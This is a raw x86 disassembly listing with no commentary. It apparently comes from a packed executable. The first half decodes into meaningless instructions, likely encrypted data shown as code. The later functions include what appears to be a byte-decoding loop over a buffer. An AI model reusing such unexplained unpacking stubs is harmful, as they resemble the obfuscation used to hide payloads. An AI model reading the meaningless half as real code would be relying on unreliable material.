  416877:	jmp    0x6715:0x4a7ee368
  41687e:	push   es
  41687f:	push   eax
  416880:	scas   eax,DWORD PTR es:[edi]
  416881:	jne    0x416831
  416883:	out    dx,al
  416884:	gs adc al,0xf3
  416887:	add    eax,edi
  416889:	adc    esp,DWORD PTR [ebx-0x32c9bf3e]
  41688f:	repz sbb eax,DWORD PTR [ecx-0x3ff561d2]
  416896:	mov    bl,0xc1
  416898:	in     eax,dx
  416899:	adc    BYTE PTR [ebx+0xf],0x79
  41689d:	jns    0x4168b2
  41689f:	add    edx,DWORD PTR [ecx+edi*8+0x63]
  4168a3:	add    BYTE PTR [eax],bh
  4168a5:	cmp    ebx,DWORD PTR [ebx-0x3b3d8f1]
  4168ab:	or     bh,bl
  4168ad:	dec    BYTE PTR [edi]
  4168af:	jp     0x4168e2
  4168b1:	sub    eax,0xd9d445d1
  4168b6:	call   0x94b1:0x6cee24e1
  4168bd:	cmc    
  4168be:	cdq    
  4168bf:	int    0xdd
  4168c1:	sbb    cl,cl
  4168c3:	leave  
  4168c4:	in     eax,0x96
  4168c6:	addr16 cs dec esi
  4168c9:	xchg   edi,eax
  4168ca:	mov    bh,0x41
  4168cc:	(bad)  
  4168cd:	pop    ebx
  4168ce:	jecxz  0x416940
  4168d0:	adc    BYTE PTR [esi-0x3c],ah
  4168d3:	jl     0x4168e8
  4168d5:	mov    ch,0x89
  4168d7:	fnstenv [esi]
  4168d9:	add    al,0xd8
  4168db:	ret    0x51af
  4168de:	(bad)  
  4168df:	lahf   
  4168e0:	ds (bad) 
  4168e2:	cwde   
  4168e3:	inc    ebx
  4168e4:	outs   dx,BYTE PTR ds:[esi]
  4168e5:	fisttp DWORD PTR [ebx]
  4168e7:	cli    
  4168e8:	adc    BYTE PTR [ebp+0x1f],dh
  4168eb:	stos   BYTE PTR es:[edi],al
  4168ec:	mov    edi,0x6c4410c2
  4168f1:	out    0xc4,al
  4168f3:	in     al,0x7f
  4168f5:	mov    dl,BYTE PTR [edi]
  4168f7:	cmp    BYTE PTR [ecx-0x74],bl
  4168fa:	add    eax,0x37101059
  4168ff:	mov    edx,0xf58b4eaa
  416904:	and    esp,ecx
  416906:	ja     0x4168ca
  416908:	test   BYTE PTR [esi+0x2a8df6b4],ah
  41690e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41690f:	jecxz  0x4168cc
  416911:	add    BYTE PTR [eax],al
  416913:	and    cl,BYTE PTR [edx]
  416915:	in     al,dx
  416916:	xchg   cl,ch
  416918:	xchg   esi,eax
  416919:	out    dx,al
  41691a:	das    
  41691b:	dec    eax
  41691c:	mov    ebp,0xa55d8699
  416921:	xchg   ebp,eax
  416922:	mov    bl,0x23
  416924:	add    ah,dl
  416926:	stos   BYTE PTR es:[edi],al
  416927:	add    BYTE PTR [ecx+0x16eb3736],0xf4
  41692e:	jno    0x41690c
  416930:	outs   dx,BYTE PTR ds:[esi]
  416931:	arpl   WORD PTR [edi+0x28e98473],cx
  416937:	or     ch,BYTE PTR [esi+0x57aa646f]
  41693d:	jp     0x41698e
  41693f:	and    eax,0x77579a1f
  416944:	jns    0x41690e
  416946:	add    al,BYTE PTR [ebp-0x33]
  416949:	lahf   
  41694a:	xor    dh,al
  41694c:	mov    DWORD PTR [edx-0x41193682],ebp
  416952:	out    0x45,eax
  416954:	jo     0x416909
  416956:	adc    BYTE PTR [eax-0x47],ch
  416959:	sub    esp,DWORD PTR [ebp-0x3237e43a]
  41695f:	out    0x91,eax
  416961:	adc    al,0xbc
  416963:	pop    eax
  416964:	xchg   esi,eax
  416965:	aaa    
  416966:	repnz lahf 
  416968:	das    
  416969:	sub    dl,dh
  41696b:	leave  
  41696c:	adc    esi,esi
  41696e:	popf   
  41696f:	sub    al,0xe4
  416971:	sub    BYTE PTR [eax-0x3b],0x9a
  416975:	inc    edx
  416976:	mov    ds:0x36435fcf,eax
  41697b:	fiadd  DWORD PTR [ecx]
  41697d:	and    al,0x91
  41697f:	pop    ss
  416980:	adc    bh,ah
  416982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416983:	xchg   DWORD PTR ss:[eax-0x37],esi
  416987:	call   0x14714fcb
  41698c:	adc    al,0x35
  41698e:	cmp    al,0x8b
  416990:	jne    0x41698e
  416992:	call   esi
  416994:	mov    DWORD PTR [ebp-0x38],eax
  416997:	cmp    DWORD PTR [ebp-0x38],0x57
  41699b:	jne    0x4169a9
  41699d:	mov    edx,DWORD PTR [ebp-0x20]
  4169a0:	push   edx
  4169a1:	call   0x401000
  4169a6:	add    esp,0x4
  4169a9:	xor    eax,eax
  4169ab:	pop    esi
  4169ac:	mov    esp,ebp
  4169ae:	pop    ebp
  4169af:	ret    
  4169b0:	push   ebp
  4169b1:	mov    ebp,esp
  4169b3:	sub    esp,0x124
  4169b9:	xor    eax,eax
  4169bb:	mov    esp,ebp
  4169bd:	pop    ebp
  4169be:	ret    
  4169bf:	push   ebp
  4169c0:	mov    ebp,esp
  4169c2:	sub    esp,0x2c
  4169c5:	push   ebx
  4169c6:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4169cd:	mov    DWORD PTR [ebp-0xc],0x0
  4169d4:	mov    DWORD PTR [ebp-0x20],0x1
  4169db:	mov    DWORD PTR [ebp-0x10],0x0
  4169e2:	mov    eax,DWORD PTR [ebp+0xc]
  4169e5:	mov    DWORD PTR [ebp-0x1c],eax
  4169e8:	mov    DWORD PTR [ebp-0x18],0x0
  4169ef:	mov    DWORD PTR [ebp-0x8],0x0
  4169f6:	mov    DWORD PTR [ebp-0x24],0x0
  4169fd:	mov    ecx,DWORD PTR [ebp-0x4]
  416a00:	sub    ecx,0x1
  416a03:	mov    DWORD PTR [ebp-0x4],ecx
  416a06:	mov    edx,DWORD PTR [ebp+0x8]
  416a09:	mov    DWORD PTR [ebp-0x10],edx
  416a0c:	mov    DWORD PTR [ebp-0x28],0x1
  416a13:	mov    eax,DWORD PTR [ebp-0x4]
  416a16:	add    eax,0x2
  416a19:	mov    DWORD PTR [ebp-0x4],eax
  416a1c:	mov    ecx,DWORD PTR [ebp-0x1c]
  416a1f:	add    ecx,DWORD PTR [ebp-0x4]
  416a22:	mov    dl,BYTE PTR [ecx+0x1]
  416a25:	mov    BYTE PTR [ebp-0x11],dl
  416a28:	mov    eax,DWORD PTR [ebp-0x4]
  416a2b:	add    eax,0x1
  416a2e:	mov    DWORD PTR [ebp-0x4],eax
  416a31:	mov    cl,BYTE PTR [ebp-0x11]
  416a34:	mov    BYTE PTR [ebp-0x29],cl
  416a37:	push   edx
  416a38:	pop    ebx
  416a39:	mov    ecx,ebx
  416a3b:	mov    edx,DWORD PTR [ebp-0x10]
  416a3e:	add    edx,DWORD PTR [ebp-0x4]
  416a41:	mov    al,BYTE PTR [ebp-0x29]
  416a44:	mov    BYTE PTR [edx],al
  416a46:	mov    ebx,esi
  416a48:	mov    ecx,DWORD PTR [ebp+0x14]
  416a4b:	add    ecx,DWORD PTR [ebp-0x8]
  416a4e:	movzx  edx,BYTE PTR [ecx]
  416a51:	mov    DWORD PTR [ebp-0xc],edx
  416a54:	mov    eax,DWORD PTR [ebp-0x8]
  416a57:	mov    ecx,DWORD PTR [ebp-0x28]
  416a5a:	add    eax,ecx
  416a5c:	mov    DWORD PTR [ebp-0x8],eax
  416a5f:	mov    eax,DWORD PTR [ebp-0x8]
  416a62:	shr    eax,0x3
  416a65:	mov    ecx,0x1
  416a6a:	sub    ecx,eax
  416a6c:	mov    DWORD PTR [ebp-0x20],ecx
  416a6f:	shr    eax,cl
  416a71:	mov    edx,DWORD PTR [ebp-0x8]
  416a74:	imul   edx,DWORD PTR [ebp-0x20]
  416a78:	mov    DWORD PTR [ebp-0x8],edx
  416a7b:	shl    ebx,0x3
  416a7e:	mov    eax,DWORD PTR [ebp-0x10]
  416a81:	add    eax,DWORD PTR [ebp-0x4]
  416a84:	movzx  ecx,BYTE PTR [eax]
  416a87:	add    ecx,DWORD PTR [ebp-0xc]
  416a8a:	mov    edx,DWORD PTR [ebp-0x10]
  416a8d:	add    edx,DWORD PTR [ebp-0x4]
  416a90:	mov    BYTE PTR [edx],cl
  416a92:	mov    eax,DWORD PTR [ebp-0x4]
  416a95:	sub    eax,0x2
  416a98:	mov    DWORD PTR [ebp-0x4],eax
  416a9b:	mov    ecx,DWORD PTR [ebp-0x4]
  416a9e:	cmp    ecx,DWORD PTR [ebp+0x10]
  416aa1:	jl     0x416a13
  416aa7:	pop    ebx
  416aa8:	mov    esp,ebp
  416aaa:	pop    ebp
  416aab:	ret    
  416aac:	jmp    DWORD PTR ds:0x417020
